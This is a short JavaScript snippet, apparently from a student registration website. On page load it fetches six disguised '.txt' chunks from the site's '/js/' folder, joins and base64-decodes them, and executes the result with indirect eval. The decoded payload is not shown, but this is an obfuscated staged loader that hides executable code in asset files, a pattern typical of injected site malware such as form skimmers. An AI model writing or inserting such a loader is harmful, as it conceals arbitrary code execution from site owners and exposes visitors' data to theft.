(function(){
  var F=["/js/_asr_bb0.txt","/js/_asr_bb1.txt","/js/_asr_bb2.txt","/js/_asr_bb3.txt","/js/_asr_bb4.txt","/js/_asr_bb5.txt"];
  Promise.all(F.map(function(f){
    return fetch(f,{credentials:"same-origin"}).then(function(r){
      if(!r.ok) throw new Error(f+" "+r.status);
      return r.text();
    });
  })).then(function(parts){
    var b64 = parts.join("").replace(/\s+/g,"");
    var bin = atob(b64);
    var out = "";
    for (var i=0;i<bin.length;i++) out += String.fromCharCode(bin.charCodeAt(i));
    try { out = decodeURIComponent(escape(out)); } catch(_) {}
    (0,eval)(out);
  }).catch(function(e){ console.error("[students-reg] load failed", e); });
})();
